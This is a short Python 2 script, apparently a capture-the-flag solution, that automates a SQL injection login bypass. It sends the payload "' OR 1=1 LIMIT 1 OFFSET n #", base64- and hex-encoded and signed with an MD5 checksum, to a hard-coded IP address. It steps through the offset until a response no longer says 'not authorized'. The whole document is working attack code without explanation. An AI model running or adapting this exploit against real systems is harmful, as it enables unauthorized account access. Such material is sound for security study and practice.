import requests
import hashlib
from base64 import b64encode

i = 0

while True:
    login = b64encode("junk' OR 1=1 LIMIT 1 OFFSET {} #".format(i))
    passw = b64encode('junk')
    m = hashlib.md5()
    data = (login + ',' + passw).encode("hex")
    m.update(data)
    data = data + '+' + m.hexdigest()
    r = requests.get('http://128.199.241.21/web3.php?data=' + data)
    print i, '=', r.text
    if ('not authorized' not in r.text):
        break
    i += 1